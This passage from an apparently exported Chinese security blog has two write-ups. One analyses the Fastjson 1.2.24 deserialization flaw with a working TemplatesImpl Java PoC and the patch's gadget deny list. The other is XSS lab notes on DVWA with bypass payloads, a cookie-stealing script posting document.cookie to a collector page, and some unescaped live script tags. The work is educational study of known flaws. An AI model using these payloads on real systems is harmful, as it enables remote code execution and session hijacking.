<p><code>_bytecodes</code>变量可以在构造json字符串时传入，在构造poc时属于可控变量</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301204117.png" alt></p>
<p>​    这里我们继续向下执行的时候需要首先满足这里的_tfactory变量不为null，因为_tfactory为私有变量，且无setter方法，<strong>这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值。(POC中设置_tfactory为{})</strong></p>
<p>在第413行,通过for循环取出值，然后交给了loader.defineClass进行处理：</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301204609.png" alt></p>
<p>loader.defineClass主要是将传入的字节码转化成class对象，然后又赋给了_class[i]。</p>
<p><strong>当我们传入比如:_bytecodes:[恶意类]这样的json字符串。程序会将恶意类化为Class对象后赋值给_class[0]。</strong></p>
<p>之后程序回到getTransletInstance中</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301221043.png" alt></p>
<p>这时，这里的<strong>_class[_transletIndex]就是我们传入的恶意类</strong>,然后调用恶意类的newInstance()方法来实例化对象,最后造成命令执行。</p>
<p>我们现在已经找到了存在漏洞的方法，现在只需要找到一条调用链即可。</p>
<p><strong>找到com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</strong></p>
<p>这里调用了存在漏洞的newTransformer() 方法:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301214640.png" alt></p>
<p>向上追踪newTransformer(),发现TemplatesImpl.java中getOutputProperties()方法中调用了newTransformer()</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301215120.png" alt></p>
<p>​    getOutputProperties()方法为<code>_outputProperties</code>成员变量的getter方法。(这里会通过smartMatch() 方法将下划线置空)</p>
<p>​        TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。getOutputProperties()返回类型为Properties，而Properties extends Hashtable，而Hashtable implements Map。无论通过fastjson哪种方式解析json字符串，都可以触发getOutputProperties()方法。</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>​    Fastjson通过_bytecodes字段传入恶意类，调用outPutProperties属性的getter方法时,实例化传入的恶意类，调用其构造方法，造成任意命令执行。</p>
<h4 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package 版本<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.<span class="keyword">parser</span>.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.<span class="keyword">parser</span>.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> jdk7u21 &#123;</span><br><span class="line">    <span class="built_in">public</span> static String readClass(String cls)&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="built_in">new</span> ByteArrayOutputStream();</span><br><span class="line">        try &#123;</span><br><span class="line">            IOUtils.<span class="keyword">copy</span>(<span class="built_in">new</span> FileInputStream(<span class="built_in">new</span> File(cls)), bos);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] try1 = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span>  test_autoTypeDeny() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        ParserConfig config = <span class="built_in">new</span> ParserConfig();</span><br><span class="line">        final String fileSeparator = <span class="keyword">System</span>.getProperty("file.separator");</span><br><span class="line">        final String evilClassPath = <span class="keyword">System</span>.getProperty("user.dir") + "\\fastjsonmaven\\target\\classes\\版本24\\EvilObject.class";</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";</span><br><span class="line">        String text1 = "&#123;\"@<span class="keyword">type</span>\":\"" + NASTY_CLASS +</span><br><span class="line">                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;," +</span><br><span class="line">                "\"_name\":\"a\",\"_version\":\"<span class="number">1.0</span>\",\"allowedProtocols\":\"<span class="keyword">all</span>\"&#125;\n";</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(text1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj = <span class="type">JSON</span>.parseObject(text1, <span class="keyword">Object</span>.<span class="keyword">class</span>, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String args[])&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; catch (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>@Type：</strong>指定解析类,根据指定类反序列化得到该类的实例,在poc中，<code>_bytecodes</code>与<code>_name</code>都是私有属性，所以要想反序列化这两个，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code></li>
<li><strong>_bytecodes</strong>:恶意类class文件二进制格式base64编码得到的字符串</li>
<li><strong>_outputProperties</strong>:调用参数的getOutputProperties方法,造成RCE。</li>
<li><strong>_tfactory:{}</strong>：在defineTransletClasses()时会调用getExternalExtensionsMap(),当为null时会报错，所以要对_tfactory 设值。</li>
</ul>
<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>​    现在我们已经知道了触发的漏洞点以及POC现在我们正向调试跟踪一下实际调用链，主要看fastjson如何处理我们传入的payload。</p>
<p>首先在JSON.parseObject这个函数这里下个断点。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228225705.png" alt></p>
<p>之后调试跟进，进入com.alibaba.fastjson.parser.DefaultJSONParser类，调用了deriallizer.deserialze来解析传入的数据。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228233331.png" alt></p>
<p>在这里的deserialze是一个接口,跟进对应的序列化类<strong>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer</strong>中。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301224110.png" alt></p>
<p>这里的代码又重新调用了<strong>DefaultJSONParser</strong>类中的<strong>parseObject</strong>方法。在这里我们的token值为12,根据if判断进入到<strong>skipWhitespace</strong> 中:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228230054.png" alt></p>
<p><strong>lexer.skipWhitespace</strong>会对传入的text(也就是我们构造好的payload进行处理)</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228231750.png" alt></p>
<p>这里我们得到的结果是<strong>“</strong>,根据if判断跟进lexer.scanSymbol方法:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228232518.png" alt></p>
<p><strong>scanSymbol</strong>会根据选择的特殊符号进入到相应的位置进行处理。也就是我们最开始时候key的结果是<code>@type</code>，而继续往下自然进入到了这里。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228232250.png" alt></p>
<p>由于 <strong>deserialze</strong> 是一个接口，序列化方法类是<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong> ，传入的clazz是我们想要实例化的利用类。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE202102282333311111.png" alt></p>
<p>接着跟进<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong>。这里的token是16，text正是我们传入的值。<img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228233425.png" alt></p>
<p>继续往下走程序会调用<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</strong>方法，</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228234359.png" alt></p>
<p>跟进方法，首先会调用smartMatch方法来处理我们传入的key值，而这里的key值就是我们json中的那些字段，比如：<code>_outputProperties</code>、<code>_name</code>、<code>_bytecodes</code>等。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228233930.png" alt></p>
<p>在<strong>com.alibaba.fastjson.serializer.ObjectArrayCodec#parseArray</strong>中，所以这里又会调用 <strong>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</strong> 。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228235300.png" alt></p>
<p>这里会先进入decodeBase64方法进行一次base64解码，<strong>这就是为什么poc中需要base64编码</strong></p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228235348.png" alt></p>
<p>在com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer 中。最后会通过setValue方式将value赋值给我们要执行的特殊类</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228235522.png" alt></p>
<p>在setValue中会调用getOutputProperties()。然后通过method.invoke反射的方式实例化我们的要调用的类。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301225104.png" alt></p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301225132.png" alt></p>
<h3 id="后续修复分析"><a href="#后续修复分析" class="headerlink" title="后续修复分析"></a>后续修复分析</h3><p>​    1.2.25官方对漏洞进行了修复，对更新的源码进行比较，主要的更新在checkAutoType函数,</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Class</span>&lt;?&gt; checkAutoType(<span class="built_in">String</span> <span class="built_in">typeName</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">typeName</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">             return <span class="literal">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         final <span class="built_in">String</span> className = <span class="built_in">typeName</span>.<span class="built_in">replace</span>(<span class="comment">'$', '.');</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">             <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                 <span class="built_in">String</span> deny = denyList[i];</span><br><span class="line">                 <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                     throw <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + <span class="built_in">typeName</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>

<p>​    这里遍历denyList数组，只要引用的库中是以我们的黑名单中的字符串开头的就直接抛出异常中断运行。</p>
<p>denyList数组，主要利用黑名单机制把常用的反序列化利用库都添加到黑名单中，主要有：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">bsh</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.mchange</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.sun</span>.</span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.lang</span><span class="selector-class">.Thread</span></span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.net</span><span class="selector-class">.Socket</span></span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.rmi</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.bcel</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.Transformer</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections4</span><span class="selector-class">.comparators</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.fileupload</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.myfaces</span><span class="selector-class">.context</span><span class="selector-class">.servlet</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.tomcat</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.wicket</span><span class="selector-class">.util</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.codehaus</span><span class="selector-class">.groovy</span><span class="selector-class">.runtime</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.hibernate</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jboss</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.mozilla</span><span class="selector-class">.javascript</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.python</span><span class="selector-class">.core</span>,<span class="selector-tag">org</span><span class="selector-class">.springframework</span></span><br></pre></td></tr></table></figure>

<p>后续的绕过接下来再分析。。。。</p>
]]></content>
  </entry>
  <entry>
    <title>XSS漏洞学习</title>
    <url>/2020/04/03/xss-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
<h5 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h5><ul>
<li>非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</li>
<li>持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</li>
<li>DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</li>
</ul>
<h5 id="XSS漏洞常见危害"><a href="#XSS漏洞常见危害" class="headerlink" title="XSS漏洞常见危害"></a>XSS漏洞常见危害</h5><ul>
<li>盗用cookie，获取敏感信息。（最常见）</li>
<li>劫持会话，执行任意操作（改密码、留言等CSRF)</li>
<li>强制弹出广告页面，刷广告流量</li>
<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
<li>钓鱼，获取用户账号，密码</li>
<li>网页挂马，挖矿</li>
</ul>
<h5 id="关于JavaScript"><a href="#关于JavaScript" class="headerlink" title="关于JavaScript"></a>关于JavaScript</h5><ul>
<li>JavaScript是一种客户端的脚本语言，是运行的浏览器中的</li>
<li>浏览器会自动运行网页中的JavaScript代码，并且JavaScript代码对于用户来说是透明的</li>
</ul>
<p>网页中运行JavaScript的方式</p>
<p>1.引入外部js</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">script</span> src=<span class="string">"https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"</span>&lt;/<span class="keyword">script</span>&gt;</span><br></pre></td></tr></table></figure>

<p>2.使用超链接（javascript伪协议）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3.使用标签</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>4.使用事件方法</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>常见事件：</p>
<table>
<thead>
<tr>
<th align="center">事件名称</th>
<th align="center">类型</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onerror</td>
<td align="center">window事件属性</td>
<td align="center">在错误发生时运行的脚本</td>
</tr>
<tr>
<td align="center">onload</td>
<td align="center">window事件属性</td>
<td align="center">页面加载结束以后运行脚本</td>
</tr>
<tr>
<td align="center">onclick</td>
<td align="center">Mouse事件</td>
<td align="center">元素上发生鼠标点击时触发</td>
</tr>
<tr>
<td align="center">onmouseover</td>
<td align="center">Mouse事件</td>
<td align="center">当鼠标指针移动到元素上时触发</td>
</tr>
<tr>
<td align="center">oninput</td>
<td align="center">From事件</td>
<td align="center">当元素获得用户输入时运行的脚</td>
</tr>
</tbody></table>
<h5 id="探测XSS过程"><a href="#探测XSS过程" class="headerlink" title="探测XSS过程"></a>探测XSS过程</h5><p>1.构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</p>
<p>   例如：hacker</p>
<p>2.使用浏览器审查工具进行代码审计，寻找构造的字符串是否在页面中显示。</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201183252.png" style="zoom:50%;">



<h5 id="xss常用的测试语句"><a href="#xss常用的测试语句" class="headerlink" title="xss常用的测试语句"></a>xss常用的测试语句</h5><ul>
<li><script>alert(1)</script>
</li>
<li><p><code>&lt;imgsrc=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&amp;#59&quot;&gt;</code>//转换为10进制</p>
</li>
<li><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p>
</li>
<li><p><code>&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;</code></p>
</li>
<li><a href="javascript:alert(1)">
</a></li>
<li><script>alert(document.cookie)</script>
</li>
<li><script>window.location="(黑页地址)";</script> 
<p>document.body.innerHTML=”<div style="visblity:visble;"><h1></h1></div></p>
</li>
</ul>
<h3 id="DVWA-XSS-部分"><a href="#DVWA-XSS-部分" class="headerlink" title="DVWA( XSS 部分)"></a>DVWA( XSS 部分)</h3><h4 id="XSS（reflect"><a href="#XSS（reflect" class="headerlink" title="XSS（reflect)"></a>XSS（reflect)</h4><p><strong>simple:</strong></p>
<p>尝试发现输入的语句直接插入到标签中</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop~31370AWY0@A%5D%%5BZYLQ8I%5BI.png" alt></p>
<p>直接使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>尝试，发现成功弹窗。</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112112615.png" style="zoom: 33%;">

<p>分析源码：</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\5M26R`@5UXK[OQGO{ZMHYD2.png" style="zoom: 50%;">

<p>代码只判断了name值是否为空。没有做任何过滤。</p>
<p><strong>尝试盗取cookie:</strong></p>
<p>在本地网站根目录新建cookie.php和cookie.txt。</p>
<p>cookie.php内容为</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112124443.png" style="zoom: 50%;">

<p>回到dvwa中构造攻击语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到cookie:</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112124855.png" style="zoom:33%;">

<p>回到DVWA的登录界面：</p>
<p>在火狐浏览器的控制台中编辑cookie重新发包：</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112125154.png" style="zoom:50%;">

<p>访问index.php发现成功以被攻击者身份登录。</p>
<p><strong>medium:</strong></p>
<p>首先尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>  发现<script>标签被过滤。</p>
<p>分析源码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112114020.png" alt=""></p>
<p>代码使用 "str_replace"函数将<script>标签替换为空，且该函数是大小写敏感。我们可以采用多种方式绕过。</p>
<p>1.大小写绕过：<SCRIPT>alert(1)</script></p>
<p>2.双写绕过：&lt;<script>script>alert(1)<</script>/script&gt;</p>
<p>3.利用img标签进行绕过：<code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
<p> <strong>PS:  onerror事件会在文档或图像加载过程中发生错误时被触发</strong></p>
<p>  <strong>因为src=x就是一个错误代码，所以触发事件执行</strong></p>
<p><strong>high</strong>:</p>
<p>尝试<script>alert(1)</script> 无效。</p>
<p>再次尝试<code>&lt;img src=1 onerror=alert(1)&gt;</code>  成功。</p>
<p>同样可以使用：<code>&lt;iframe onload=alert(1)&gt;</code></p>
<p><strong>PS:<iframe>标签可以在一个html代码中嵌入另一个html内容</iframe></strong></p>
<p>​      <strong>onload 是js的一个事件，事件会在页面加载完成后，立即发生，同时执行被调用的程序。</strong></p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112114820.png" style="zoom:33%;">

<p>分析源码：</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112115042.png" alt></p>
<p><strong>impossible:</strong></p>
<p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>发现语句被原封不动输出。</p>
<p>查看后台代码：</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112130818.png" style="zoom: 50%;">

<p>引用博客大佬解释：</p>
<p>利用PHP函数<code>htmlspecialchars()</code>实现将特殊字符（逻辑与符号<code>&amp;</code>、双引号<code>&quot;</code>、单引号<code>&#39;</code>、小于号<code>&lt;</code>、大于号<code>&gt;</code>）转换为 HTML 实体，从而使得浏览器不解析其作为html元素构造脚本来执行，只是作为普通输入的字符来显示。</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112141718.png" style="zoom: 67%;">



<h4 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS DOM"></a>XSS DOM</h4><p><strong>DOM xss产生的原因：</strong></p>
<p>​         DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞<br><strong>常用 xss DOM属性：</strong></p>
<p>document.referer</p>
<p>window.name</p>
<p>location</p>
<p>innerHTML</p>
<p>document.write</p>
<p>simple:</p>
<p>查看后台代码：</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112131409.png" alt>  </p>
<p> 什么都没有做。。。</p>
<p>随便选择一种语言：</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132346.png" alt></p>
<p>我们可以在之后接入我们想要执行的代码：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>成功弹窗：</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112132515.png" style="zoom:33%;">

<p> 火狐查看页面元素：</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132558.png" alt></p>
<p><strong>medium:</strong></p>
<p>查看后台代码：</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112133547.png" style="zoom: 50%;">

<p>代码使用了stripos函数过滤了<strong>&lt;script</strong>.并且不区分大小写。</p>
<p>我们可以使用<code>&lt;img src=1 onerror=1&gt;</code>绕过</p>
<p>我们查看页面源码：</p>
<option value="    "+lang+"      "> "  +decodeURl(lang) +  " </option>

<p>我们的目的是让语句插入option标签的值中进而执行。</p>
<p>直接插入：</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112134126.png" alt></p>
<p>尝试闭合前面<option></option><select>标签</select></p>
<p>插入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code>成功</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112134639.png" style="zoom:33%;">

<p><strong>high:</strong></p>
<p>查看后台代码</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112134821.png" style="zoom: 67%;">

<p>白名单过滤，只允许传指定的default值。</p>
<p><strong>补充知识：url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤</strong></p>
<p>构造攻击代码：</p>
<p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112140826.png" style="zoom: 33%;">

<p><strong>impossible:</strong></p>
